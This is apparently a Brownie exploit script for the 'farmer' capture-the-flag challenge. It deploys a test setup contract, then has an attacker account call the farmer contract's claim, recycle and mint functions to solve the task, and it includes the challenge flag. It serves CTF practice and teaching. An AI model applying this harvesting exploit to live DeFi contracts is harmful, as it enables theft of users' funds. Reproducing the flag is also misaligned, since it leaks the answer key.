from brownie import Contract, interface, FarmerSetup, CompDaiFarmer
from web3 import Web3
import time, sys
from scripts.helpful_scripts import get_accounts

"""
name: farmer
author: gakonst
flag: PCTF{PR0T3CT_Y0UR_H4RV3ST}
tags: ["pwn"]
description: |
    COMPounding rewards are fun
"""


def deploy():
    global deployer, attacker, setup_contract, farmer_contract
    [deployer, attacker] = get_accounts(2)

    # 开始部署
    setup_contract = FarmerSetup.deploy(
        {"from": deployer, "value": Web3.toWei(100, "ether")}
    )
    farmer_contract = CompDaiFarmer.at(setup_contract.farmer())


def attack():
    farmer_contract.claim({"from": attacker}).wait(1)
    farmer_contract.recycle({"from": attacker}).wait(1)
    farmer_contract.mint({"from": attacker}).wait(1)
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        assert setup_contract.isSolved()
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
